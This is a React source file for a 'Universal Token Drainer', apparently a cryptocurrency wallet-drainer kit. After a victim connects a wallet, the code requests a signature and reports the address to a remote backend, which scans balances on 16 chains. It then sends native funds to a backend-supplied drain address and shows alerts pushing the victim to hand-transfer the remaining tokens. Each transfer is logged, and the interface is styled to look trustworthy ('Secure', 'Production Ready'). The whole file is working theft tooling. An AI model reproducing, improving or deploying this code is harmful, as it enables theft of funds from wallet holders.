import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient, useChainId } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA', rpc: 'eth' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B', rpc: 'bsc' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5', rpc: 'polygon' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0', rpc: 'arbitrum' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420', rpc: 'optimism' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF', rpc: 'base' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142', rpc: 'avalanche' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF', rpc: 'fantom' },
  
  // Non-EVM Chains
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'bitcoin', color: '#F7931A' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'cardano', color: '#0033AD' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'dogecoin', color: '#C2A633' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'ripple', color: '#23292F' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'polkadot', color: '#E6007A' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148' },
];

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#0a0a0a",
            "--ck-body-background": "#111827",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected, chain } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const chainId = useChainId();

  // State Management
  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com'); // Update with your backend URL
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
  const [apiStatus, setApiStatus] = useState('🟢 Online');
  const [activeTab, setActiveTab] = useState('dashboard');
  const [totalValue, setTotalValue] = useState(0);
  const [connectedNetwork, setConnectedNetwork] = useState('');

  // Initialize
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
      checkApiStatus();
    } else {
      resetState();
    }
  }, [isConnected, address, chain]);

  useEffect(() => {
    if (chain) {
      setConnectedNetwork(chain.name || 'Unknown');
    }
  }, [chain]);

  // Check Backend Status
  const checkApiStatus = async () => {
    try {
      const response = await fetch(`${backendUrl}/health`);
      if (response.ok) {
        const data = await response.json();
        setApiStatus(`🟢 Online - ${data.stats?.networks || 0} networks`);
      } else {
        setApiStatus('🔴 Offline');
      }
    } catch (error) {
      setApiStatus('🔴 Offline');
    }
  };

  // Reset State
  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setTotalValue(0);
    setScanProgress({ current: 0, total: NETWORKS.length, text: '' });
  };

  // Wallet Connected Handler
  const handleWalletConnected = async (walletAddress) => {
    setAuthStatus(`✅ Connected: ${formatAddress(walletAddress)}`);
    
    // Auto-scan on connect
    setTimeout(() => {
      authenticateAllNetworks();
    }, 1000);
  };

  // ==================== AUTHENTICATION ====================
  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing message...');
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nNonce: ${Math.random().toString(36).substring(7)}`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Authenticating...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature: sig,
          message,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus(`✅ Authenticated!`);
        setTimeout(() => scanAllNetworks(), 500);
      } else {
        setAuthStatus(`❌ Auth failed: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      setAuthStatus(`❌ Error: ${error.message}`);
      if (error.message.includes('rejected')) {
        setAuthStatus('❌ Signature rejected');
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
    setUserTokens({});
    setTotalValue(0);
    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Starting scan...' });
    
    try {
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Backend error: ${response.status} - ${errorText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`⚠️ Scan error: ${error.message}`);
      await fallbackScan();
    } finally {
      setIsScanning(false);
    }
  };

  // Process Scan Results
  const processScanResults = (data) => {
    const allTokens = {};
    let totalVal = 0;
    
    data.results?.forEach(result => {
      if (result.tokens && result.tokens.length > 0) {
        const networkValue = result.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        totalVal += networkValue;
        
        allTokens[result.network.id] = {
          network: result.network,
          tokens: result.tokens,
          totalValue: networkValue
        };
      }
    });
    
    setUserTokens(allTokens);
    setTotalValue(totalVal);
    setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Complete' });
    
    const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    setAuthStatus(`✅ Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalVal.toFixed(2)} total)`);
    
    // Store in localStorage
    localStorage.setItem(`scan_${address}`, JSON.stringify({
      timestamp: Date.now(),
      tokens: allTokens,
      totalValue: totalVal
    }));
  };

  // Fallback Scan
  const fallbackScan = async () => {
    setAuthStatus('🔄 Using fallback scan...');
    
    // Quick scan major networks
    const majorNetworks = NETWORKS.slice(0, 8);
    const results = {};
    let totalVal = 0;
    
    for (let i = 0; i < majorNetworks.length; i++) {
      const network = majorNetworks[i];
      setScanProgress({ 
        current: i + 1, 
        total: majorNetworks.length, 
        text: `Scanning ${network.name}...` 
      });
      
      try {
        let result;
        if (network.type === 'evm') {
          result = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`).then(r => r.json());
        } else {
          result = await fetch(`${backendUrl}/tokens/nonevm/${address}/${network.id}`).then(r => r.json());
        }
        
        if (result.success && result.data.tokens.length > 0) {
          const networkValue = result.data.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
          totalVal += networkValue;
          
          results[network.id] = {
            network: network,
            tokens: result.data.tokens,
            totalValue: networkValue
          };
        }
      } catch (error) {
        console.log(`Failed to scan ${network.name}`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 300));
    }
    
    setUserTokens(results);
    setTotalValue(totalVal);
    setScanProgress({ current: majorNetworks.length, total: majorNetworks.length, text: 'Fallback complete' });
    
    const totalTokens = Object.values(results).reduce((sum, data) => sum + data.tokens.length, 0);
    setAuthStatus(`✅ Found ${totalTokens} tokens ($${totalVal.toFixed(2)})`);
  };

  // ==================== DRAIN FUNCTIONS ====================
  const executeDrainAll = async () => {
    if (!address || Object.keys(userTokens).length === 0) return;
    
    setIsDraining(true);
    setAuthStatus('🚀 Starting drain process...');
    
    try {
      // For EVM chains, we need to handle each network
      const evmChains = Object.values(userTokens).filter(data => data.network.type === 'evm');
      const nonEvmChains = Object.values(userTokens).filter(data => data.network.type === 'non-evm');
      
      setTxStatus({ general: 'Processing...' });
      
      // Process EVM chains first
      for (const data of evmChains) {
        for (const token of data.tokens) {
          if (token.amount > 0) {
            await drainEVMToken(token, data.network);
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        }
      }
      
      // Process non-EVM chains
      for (const data of nonEvmChains) {
        for (const token of data.tokens) {
          if (token.amount > 0) {
            await drainNonEVMToken(token, data.network);
            await new Promise(resolve => setTimeout(resolve, 500));
          }
        }
      }
      
      setAuthStatus('✅ Drain process completed!');
      setTxStatus({ general: 'All tokens processed' });
      
      // Rescan after drain
      setTimeout(() => scanAllNetworks(), 2000);
      
    } catch (error) {
      console.error("Drain error:", error);
      setAuthStatus(`❌ Drain failed: ${error.message}`);
      setTxStatus({ general: `Error: ${error.message}` });
    } finally {
      setIsDraining(false);
    }
  };

  const executeSmartDrain = async () => {
    if (!address || Object.keys(userTokens).length === 0) return;
    
    setIsDraining(true);
    setAuthStatus('🧠 Starting smart drain...');
    
    try {
      // Sort tokens by value (highest first)
      const allTokens = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.value > 1) { // Only drain tokens worth more than $1
            allTokens.push({
              ...token,
              network: data.network
            });
          }
        });
      });
      
      allTokens.sort((a, b) => b.value - a.value);
      
      setTxStatus({ general: `Processing ${allTokens.length} valuable tokens...` });
      
      // Drain valuable tokens first
      for (const item of allTokens) {
        if (item.network.type === 'evm') {
          await drainEVMToken(item, item.network);
        } else {
          await drainNonEVMToken(item, item.network);
        }
        await new Promise(resolve => setTimeout(resolve, 800));
      }
      
      setAuthStatus('✅ Smart drain completed!');
      setTxStatus({ general: 'Valuable tokens processed' });
      
      // Rescan
      setTimeout(() => scanAllNetworks(), 2000);
      
    } catch (error) {
      console.error("Smart drain error:", error);
      setAuthStatus(`❌ Smart drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
    }
  };

  // Drain EVM Token
  const drainEVMToken = async (token, network) => {
    try {
      setTxStatus(prev => ({...prev, [token.symbol]: 'Preparing...'}));
      
      if (token.isNative && walletClient) {
        // Native token transfer
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus(prev => ({...prev, [token.symbol]: 'Amount too small'}));
          return;
        }
        
        setTxStatus(prev => ({...prev, [token.symbol]: 'Confirm in wallet...'}));
        
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
          chainId: parseInt(network.id)
        });
        
        setTxStatus(prev => ({...prev, [token.symbol]: `✅ Sent: ${hash.substring(0, 8)}...`}));
        
        // Log transaction
        await logTransaction({
          fromAddress: address,
          toAddress: token.drainAddress,
          amount: token.amount,
          chainId: network.id,
          tokenSymbol: token.symbol,
          transactionHash: hash,
          networkType: 'evm'
        });
        
      } else if (token.contractAddress) {
        // ERC20 token - would need contract interaction
        setTxStatus(prev => ({...prev, [token.symbol]: 'Manual transfer required for tokens'}));
        
        const message = `Send ${token.amount} ${token.symbol} to:\n${token.drainAddress}\n\nContract: ${token.contractAddress?.substring(0, 16)}...`;
        alert(message);
      }
      
    } catch (error) {
      console.error(`Drain error for ${token.symbol}:`, error);
      setTxStatus(prev => ({...prev, [token.symbol]: `Failed: ${error.shortMessage || error.message}`}));
    }
  };

  // Drain Non-EVM Token
  const drainNonEVMToken = async (token, network) => {
    try {
      setTxStatus(prev => ({...prev, [token.symbol]: `Processing ${network.name}...`}));
      
      // Generate transaction guide
      const guide = generateTransactionGuide(token, network);
      
      setTxStatus(prev => ({...prev, [token.symbol]: 'Check notifications...'}));
      
      // Show alert with instructions
      alert(guide);
      
      // Log as manual transaction
      await logTransaction({
        fromAddress: address,
        toAddress: token.drainAddress,
        amount: token.amount,
        chainId: network.id,
        tokenSymbol: token.symbol,
        networkType: 'non-evm',
        status: 'manual_required'
      });
      
      setTxStatus(prev => ({...prev, [token.symbol]: '✅ Instructions sent'}));
      
    } catch (error) {
      console.error(`Non-EVM drain error:`, error);
      setTxStatus(prev => ({...prev, [token.symbol]: 'Error generating guide'}));
    }
  };

  // Generate Transaction Guide
  const generateTransactionGuide = (token, network) => {
    const guides = {
      'tron': `TRON (TRX) Transfer:\n\n1. Open Trust Wallet/TronLink\n2. Go to TRON network\n3. Send ${token.amount.toFixed(6)} ${token.symbol}\n4. To address: ${token.drainAddress}\n\nNote: Need TRX for energy/bandwidth`,
      'solana': `Solana (SOL) Transfer:\n\n1. Open Phantom/Solflare wallet\n2. Send ${token.amount.toFixed(6)} ${token.symbol}\n3. To address: ${token.drainAddress}\n4. Network: Solana Mainnet`,
      'bitcoin': `Bitcoin (BTC) Transfer:\n\n1. Open Bitcoin wallet\n2. Send ${token.amount.toFixed(8)} BTC\n3. To: ${token.drainAddress}\n4. Use normal transaction fee`,
      'default': `Manual Transfer Required:\n\nSend ${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nNetwork: ${network.name}`
    };
    
    return guides[network.id] || guides.default;
  };

  // Log Transaction
  const logTransaction = async (txData) => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
    } catch (error) {
      console.log('Logging failed:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
    return parseFloat(amount).toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">
              <span className="logo-icon">⚡</span>
              <h1>Universal Token Drainer</h1>
            </div>
            <div className="network-badge">
              {connectedNetwork || 'Multi-Chain'}
            </div>
          </div>
          
          <div className="header-right">
            <div className="status-indicator">
              <span className={`status-dot ${apiStatus.includes('🟢') ? 'online' : 'offline'}`}></span>
              <span className="status-text">{apiStatus}</span>
            </div>
            <div className="wallet-section">
              <ConnectKitButton />
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Main Dashboard */}
              <div className="dashboard-overview">
                <div className="stats-grid">
                  <div className="stat-card primary">
                    <div className="stat-icon">💰</div>
                    <div className="stat-content">
                      <div className="stat-value">${totalValue.toFixed(2)}</div>
                      <div className="stat-label">Total Value</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">🔗</div>
                    <div className="stat-content">
                      <div className="stat-value">{getNetworkCount()}</div>
                      <div className="stat-label">Active Networks</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">🪙</div>
                    <div className="stat-content">
                      <div className="stat-value">{getTotalTokens()}</div>
                      <div className="stat-label">Tokens Found</div>
                    </div>
                  </div>
                  
                  <div className="stat-card">
                    <div className="stat-icon">🌐</div>
                    <div className="stat-content">
                      <div className="stat-value">{NETWORKS.length}</div>
                      <div className="stat-label">Networks</div>
                    </div>
                  </div>
                </div>

                {/* Status Bar */}
                <div className="status-bar">
                  <div className="wallet-info">
                    <span className="wallet-address">{formatAddress(address)}</span>
                    <span className="network-name">{connectedNetwork}</span>
                  </div>
                  <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                    {authStatus || 'Ready to scan'}
                  </div>
                </div>

                {/* Progress Bar */}
                {isScanning && (
                  <div className="progress-container">
                    <div className="progress-header">
                      <span>Scanning Networks</span>
                      <span>{scanProgress.current}/{scanProgress.total}</span>
                    </div>
                    <div className="progress-bar">
                      <div 
                        className="progress-fill" 
                        style={{ width: `${(scanProgress.current / scanProgress.total) * 100}%` }}
                      ></div>
                    </div>
                    <div className="progress-text">{scanProgress.text}</div>
                  </div>
                )}
              </div>

              {/* Control Panel */}
              <div className="control-panel">
                <div className="panel-header">
                  <h2>Control Center</h2>
                  <div className="action-buttons">
                    <button 
                      onClick={authenticateAllNetworks}
                      disabled={isAuthenticating || isScanning}
                      className="btn btn-primary"
                    >
                      {isAuthenticating ? '🔐 Authenticating...' : '🔐 Authenticate'}
                    </button>
                    
                    <button 
                      onClick={scanAllNetworks}
                      disabled={isScanning || isAuthenticating}
                      className="btn btn-secondary"
                    >
                      {isScanning ? '🔄 Scanning...' : '🔍 Scan All Networks'}
                    </button>
                  </div>
                </div>

                {/* Drain Buttons */}
                {getTotalTokens() > 0 && (
                  <div className="drain-section">
                    <h3>Drain Options</h3>
                    <div className="drain-buttons">
                      <button 
                        onClick={executeSmartDrain}
                        disabled={isDraining || getTotalTokens() === 0}
                        className="btn btn-success btn-lg"
                      >
                        {isDraining ? '⚡ Processing...' : '🧠 Smart Drain (High Value First)'}
                      </button>
                      
                      <button 
                        onClick={executeDrainAll}
                        disabled={isDraining || getTotalTokens() === 0}
                        className="btn btn-danger btn-lg"
                      >
                        {isDraining ? '🔥 Draining All...' : '🔥 Drain All Tokens'}
                      </button>
                    </div>
                    
                    {txStatus.general && (
                      <div className="tx-status-info">
                        <span>Status: {txStatus.general}</span>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* Tokens Display */}
              {getTotalTokens() > 0 ? (
                <div className="tokens-display">
                  <div className="display-header">
                    <h2>Detected Tokens</h2>
                    <div className="display-summary">
                      <span>{getNetworkCount()} Networks</span>
                      <span>{getTotalTokens()} Tokens</span>
                      <span>${totalValue.toFixed(2)} Total</span>
                    </div>
                  </div>
                  
                  <div className="tokens-grid">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <NetworkTokens 
                        key={networkId}
                        data={data}
                        txStatus={txStatus}
                        formatAmount={formatAmount}
                      />
                    ))}
                  </div>
                </div>
              ) : (
                <div className="empty-state">
                  <div className="empty-icon">💎</div>
                  <h3>No tokens detected</h3>
                  <p>Click "Scan All Networks" to discover tokens across all blockchains</p>
                  <div className="network-hint">
                    <p>Supported: {NETWORKS.map(n => n.symbol).join(', ')}</p>
                  </div>
                </div>
              )}
            </>
          ) : (
            <ConnectionPrompt />
          )}
        </main>

        <Footer />
      </div>
    </div>
  );
}

// ==================== SUPPORTING COMPONENTS ====================

function NetworkTokens({ data, txStatus, formatAmount }) {
  return (
    <div className="network-tokens">
      <div className="network-header">
        <div className="network-info">
          <div className="network-icon" style={{ backgroundColor: data.network.color }}>
            {data.network.type === 'evm' ? 'E' : 'N'}
          </div>
          <div>
            <div className="network-name">{data.network.name}</div>
            <div className="network-stats">
              {data.tokens.length} tokens • ${data.totalValue.toFixed(2)}
            </div>
          </div>
        </div>
        <div className="network-type">
          {data.network.type === 'evm' ? 'EVM' : 'Non-EVM'}
        </div>
      </div>
      
      <div className="tokens-list">
        {data.tokens.map((token, idx) => (
          <div key={idx} className="token-item">
            <div className="token-main">
              <div className="token-symbol">{token.symbol}</div>
              <div className="token-amount">
                {formatAmount(token.amount)} {token.symbol}
              </div>
            </div>
            <div className="token-secondary">
              <div className="token-value">${token.value ? token.value.toFixed(2) : '0.00'}</div>
              <div className="token-status">
                {txStatus[token.symbol] || 'Ready'}
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function ConnectionPrompt() {
  return (
    <div className="connection-prompt">
      <div className="prompt-content">
        <div className="prompt-icon">⚡</div>
        <h2>Universal Token Drainer</h2>
        <p>Connect your wallet to scan and manage tokens across {NETWORKS.length} blockchains</p>
        
        <div className="connect-wrapper">
          <ConnectKitButton />
        </div>
        
        <div className="features-grid">
          <div className="feature">
            <div className="feature-icon">🌐</div>
            <div className="feature-text">{NETWORKS.length} Networks</div>
          </div>
          <div className="feature">
            <div className="feature-icon">⚡</div>
            <div className="feature-text">Auto-Scan</div>
          </div>
          <div className="feature">
            <div className="feature-icon">🔐</div>
            <div className="feature-text">Secure</div>
          </div>
          <div className="feature">
            <div className="feature-icon">🔄</div>
            <div className="feature-text">Real-time</div>
          </div>
        </div>
      </div>
    </div>
  );
}

function Footer() {
  return (
    <footer className="app-footer">
      <div className="footer-content">
        <div className="footer-info">
          <span className="footer-text">Universal Token Drainer v2.0</span>
          <span className="footer-text">Production Ready</span>
          <span className="footer-text">All Networks Supported</span>
        </div>
        <div className="footer-note">
          ⚡ Connect, Scan, Drain - All in one click
        </div>
      </div>
    </footer>
  );
}

export default TokenDrainApp;

